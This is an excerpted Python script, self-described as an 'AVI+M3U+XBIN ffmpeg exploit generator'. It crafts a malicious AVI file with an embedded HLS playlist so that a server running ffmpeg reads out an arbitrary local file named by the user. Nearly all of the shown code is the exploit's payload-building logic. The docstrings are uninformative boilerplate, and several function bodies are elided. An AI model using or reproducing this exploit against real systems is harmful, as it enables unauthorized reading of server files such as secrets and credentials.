...
XBIN_HEADER = b'XBIN\x1a \x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00'

def echo_block(block):
    """Return the result of echo_block using parameters: block."""
    assert len(block) == 16
    iv = ''.join(map('{:02x}'.format, [x ^ y for x, y in zip(block, GAMMA)]))
    return ECHO_TEMPLATE.format(needed=block, iv=iv)

def gen_xbin_sync():
    """Return the result of gen_xbin_sync using parameters: no arguments."""
    seq = []
    for i in range(60):
        if i % 2:
            seq.append(0)
...
def test_xbin_sync(seq):
    """Calculate and return the output of test_xbin_sync based on seq."""
...
def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3):
    """Implement the make_playlist_avi operation on the given input: playlist, fake_packets, fake_packet_len."""
...
def gen_xbin_packet_header(size):
    """Execute gen_xbin_packet_header with input (size)."""
    return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])

def gen_xbin_packet_playlist(filename, offset, packet_size):
    """Compute gen_xbin_packet_playlist given filename, offset, packet_size."""
    result = []
    while packet_size > 0:
        packet_size -= 16
        ...
        result.append(EXTERNAL_REFERENCE_PLAYLIST.format(size=part_size, offset=offset, filename=filename))
        offset += part_size
    return (''.join(result), offset)

def gen_xbin_playlist(filename_to_read):
    """Process data using gen_xbin_playlist with arguments filename_to_read."""
    ...
    for max_offs, filename in ((5000, filename_to_read), (500, 'file:///dev/zero')):
        ...
        while offset < max_offs:
            for _ in range(10):
                pls_part, new_offset = gen_xbin_packet_playlist(filename, offset, 240 - next_delta)
                pls.append(pls_part)
                next_delta = 0
            offset = new_offset
        pls.append(SYNC)
    return FULL_PLAYLIST.format(content=''.join(pls), rand=''.join((random.choice(string.ascii_lowercase) for i in range(30))))
if __name__ == '__main__':
    parser = argparse.ArgumentParser('AVI+M3U+XBIN ffmpeg exploit generator')
    parser.add_argument('filename', help='filename to be read from the server (prefix it with "file://")')
